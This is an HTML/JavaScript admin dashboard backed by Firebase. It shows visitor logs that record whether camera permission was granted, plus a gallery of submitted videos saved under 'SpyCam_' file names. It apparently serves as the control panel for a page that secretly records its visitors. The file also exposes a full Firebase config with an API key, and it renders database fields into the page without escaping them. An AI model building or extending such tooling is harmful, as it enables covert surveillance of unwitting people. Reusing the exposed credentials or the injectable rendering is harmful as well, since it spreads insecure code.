<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Admin Dashboard - Recordings</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen p-6">

  <div class="max-w-4xl mx-auto space-y-6">
    <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl shadow-xl flex justify-between items-center">
      <div>
        <h1 class="text-xl font-bold text-cyan-400">Admin Dashboard</h1>
        <p class="text-xs text-slate-400 mt-1">Real-time Visitor Logs & Video Recordings</p>
      </div>
      <button id="deleteAllBtn" class="bg-red-600/20 hover:bg-red-600/40 text-red-400 border border-red-600/50 px-4 py-2 rounded-xl text-xs font-bold transition-all">
        Delete All Data
      </button>
    </div>

    <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl space-y-4">
      <h2 class="text-sm font-semibold text-slate-300 uppercase tracking-wider">Visitor Access Logs</h2>
      <div id="logsContainer" class="space-y-2 max-h-60 overflow-auto text-sm">
        <p class="text-slate-500 italic">Loading access logs...</p>
      </div>
    </div>

    <div class="bg-slate-900 border border-slate-800 rounded-3xl p-6 shadow-xl space-y-4">
      <h2 class="text-sm font-semibold text-slate-300 uppercase tracking-wider">Submitted Video Recordings</h2>
      <div id="videosContainer" class="grid grid-cols-1 md:grid-cols-2 gap-4">
        <p class="text-slate-500 italic">Loading video recordings...</p>
      </div>
    </div>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { getDatabase, ref, onValue, remove } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

    const firebaseConfig = {
  apiKey: "AIzaSyAbpMValCkTWyCWLBiTN5hF_2i2MWn8pPU",
  authDomain: "ram-jay.firebaseapp.com",
  databaseURL: "https://ram-jay-default-rtdb.firebaseio.com",
  projectId: "ram-jay",
  storageBucket: "ram-jay.firebasestorage.app",
  messagingSenderId: "405955896051",
  appId: "1:405955896051:web:408e4225292e94c3274d86",
  measurementId: "G-222S4YPSWQ"
};

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    // DECODER: Base64 string to Blob URL for optimized Memory Usage
    function base64ToBlobUrl(base64Data) {
      try {
        const parts = base64Data.split(';base64,');
        const contentType = parts[0].split(':')[1] || 'video/webm';
        const raw = window.atob(parts[1]);
        const rawLength = raw.length;
        const uInt8Array = new Uint8Array(rawLength);
        for (let i = 0; i < rawLength; ++i) { uInt8Array[i] = raw.charCodeAt(i); }
        return URL.createObjectURL(new Blob([uInt8Array], { type: contentType }));
      } catch (e) {
        return base64Data; // Fallback
      }
    }

    document.getElementById('deleteAllBtn').addEventListener('click', () => {
      if (confirm("WARNING: This will permanently delete ALL data. Are you sure?")) {
        remove(ref(db, '/')).then(() => location.reload());
      }
    });

    onValue(ref(db, 'visits_log'), (snapshot) => {
      const data = snapshot.val();
      const logsContainer = document.getElementById('logsContainer');
      logsContainer.innerHTML = data ? "" : `<p class="text-slate-500 italic">No logs found.</p>`;
      if (data) {
        Object.values(data).reverse().forEach(log => {
          const color = log.permission === "Granted" ? "text-green-400" : "text-red-400";
          logsContainer.innerHTML += `
            <div class="bg-slate-950 p-3 rounded-xl border border-slate-800 flex justify-between items-center text-xs">
              <p class="text-slate-300">Visited: ${new Date(log.timestamp).toLocaleString()}</p>
              <span class="font-bold ${color}">${log.permission}</span>
            </div>`;
        });
      }
    });

    onValue(ref(db, 'recorded_videos'), (snapshot) => {
      const data = snapshot.val();
      const videosContainer = document.getElementById('videosContainer');
      videosContainer.innerHTML = data ? "" : `<p class="text-slate-500 italic">No recordings found.</p>`;
      
      if (data) {
        // Reverse array to show newest first
        Object.entries(data).reverse().forEach(([key, item]) => {
          
          // Decode Base64 to Object URL to prevent DOM Memory Leak
          const videoObjectUrl = base64ToBlobUrl(item.videoData);
          const fileName = `SpyCam_${new Date(item.createdAt).getTime()}.webm`;

          const card = document.createElement('div');
          card.className = "bg-slate-950 p-4 rounded-2xl border border-slate-800 flex flex-col gap-3";
          card.innerHTML = `
            <div class="flex justify-between items-center text-[10px]">
              <span class="text-slate-400">${new Date(item.createdAt).toLocaleString()}</span>
              <span class="bg-cyan-500/10 text-cyan-400 px-2 py-0.5 rounded border border-cyan-500/20">${item.duration}s Video</span>
            </div>
            
            <!-- Preload metadata stops browser crashing on multiple videos -->
            <video controls preload="metadata" src="${videoObjectUrl}" class="w-full h-40 object-cover bg-black rounded-xl border border-slate-800"></video>
            
            <a href="${videoObjectUrl}" download="${fileName}" class="w-full bg-cyan-500/10 hover:bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 text-center py-2 rounded-xl text-xs font-bold transition-all">
              ↓ Download Video
            </a>
          `;
          videosContainer.appendChild(card);
        });
      }
    });
  </script>
</body>
</html>
